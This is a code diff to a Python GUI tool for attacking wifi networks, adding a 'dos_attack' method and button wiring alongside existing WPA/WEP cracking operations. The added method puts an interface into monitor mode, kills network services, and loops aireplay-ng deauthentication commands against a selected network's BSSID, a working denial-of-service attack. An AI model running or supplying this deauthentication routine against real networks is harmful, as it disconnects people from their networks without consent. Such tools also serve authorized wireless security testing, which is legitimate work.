@@ -643,6 +643,8 @@ class Control:
             self.silent_attack = value
         elif operation == Operation.OPEN_CRACKED:
             self.open_cracked_passwords()
+        elif operation == Operation.DOS_ATTACK:
+            self.dos_attack(value)
 
     def stop_running(self):
         """
@@ -780,37 +782,18 @@ class Control:
         :Author: Miguel Yanes Fernández
         """
         self.view.get_notify_buttons(["scan_wpa"], True)
-        self.view.get_notify_buttons(["stop_scan_wpa", "attack_wpa", "stop_attack_wpa",
-                                      "attack_wep", "stop_attack_wep"], False)
-
-    def set_buttons_wpa_scanning(self):
-        """
-        Set buttons state for the scaning mode in wpa
-        :return: none
-
-        :Author: Miguel Yanes Fernández
-        """
-        self.view.get_notify_buttons(["stop_scan_wpa"], True)
-        self.view.get_notify_buttons(["scan_wpa", "attack_wpa", "stop_attack_wpa"], False)
+        self.view.get_notify_buttons(["attack_wpa", "attack_wep", "dos_wpa"], False)
 
     def set_buttons_wpa_scanned(self):
         """
         Sets buttons state for the scanned mode
         """
-        self.view.get_notify_buttons(["scan_wpa", "attack_wpa"], True)
-        self.view.get_notify_buttons(["stop_scan_wpa", "stop_attack_wpa"], False)
-
-    def set_buttons_wpa_attacking(self):
-        self.view.get_notify_buttons(["stop_attack_wpa"], True)
-        self.view.get_notify_buttons(["scan_wpa", "stop_scan_wpa", "attack_wpa"], False)
+        self.view.get_notify_buttons(["scan_wpa", "attack_wpa", "dos_wpa"], True)
 
     def set_buttons_wep_initial(self):
         self.view.get_notify_buttons(["attack_wep"], True)
-        self.view.get_notify_buttons(["stop_attack_wep"], False)
 
-    def set_buttons_wep_attacking(self):
-        self.view.get_notify_buttons(["attack_wep"], False)
-        self.view.get_notify_buttons(["stop_attack_wep"], True)
+
 
     def scan_wpa(self):
         """
@@ -819,7 +802,6 @@ class Control:
 
         :Author: Miguel Yanes Fernández
         """
-        self.set_buttons_wpa_scanning()
 
         network = self.model.search_network(self.selected_network)
 
@@ -861,8 +843,6 @@ class Control:
 
         :Author: Miguel Yanes Fernández
         """
-        self.set_buttons_wep_attacking()
-        self.set_buttons_wpa_attacking()
 
         password = self.check_cracked_networks(self.passwords_file_name)
         if password != "":
@@ -1214,3 +1194,34 @@ class Control:
             thread.start()
         except FileNotFoundError:
             self.show_warning_notification("No stored cracked networks. You need to do and finish an attack")
+
+    def dos_attack(self, seconds):
+        """
+        Performs a Dos Attack using aireplay-ng.
+
+        :param seconds: number of deauth packets to send.
+        :return:
+        """
+        print("---------------------------------------------------------------------" + seconds)
+        network_mac = self.model.search_network(self.selected_network).get_bssid()
+        interface = self.selected_interface
+        interface_mon = interface + "mon"
+
+        airmon_start = ['airmon-ng', 'start', interface]
+        check_kill = ['airmon-ng', 'check', 'kill']
+        aireplay = ['aireplay-ng', '-0', '5', '--ignore-negative-one', '-a', network_mac, '-D', interface_mon]
+        airmon_stop = ['airmon-ng', 'stop', interface]
+        restart_NM = ['NetworkManager']
+
+        self.show_message("EXECUTING DoS ATTACK")
+        self.execute_command(airmon_start)
+        self.execute_command(check_kill)
+        time.sleep(2)
+        for x in range(0, int(seconds)):
+            self.execute_command(aireplay)
+        time.sleep(2)
+        self.execute_command(airmon_stop)
+        self.execute_command(restart_NM)
+        self.show_message("DoS ATTACK FINISHED")
+
+
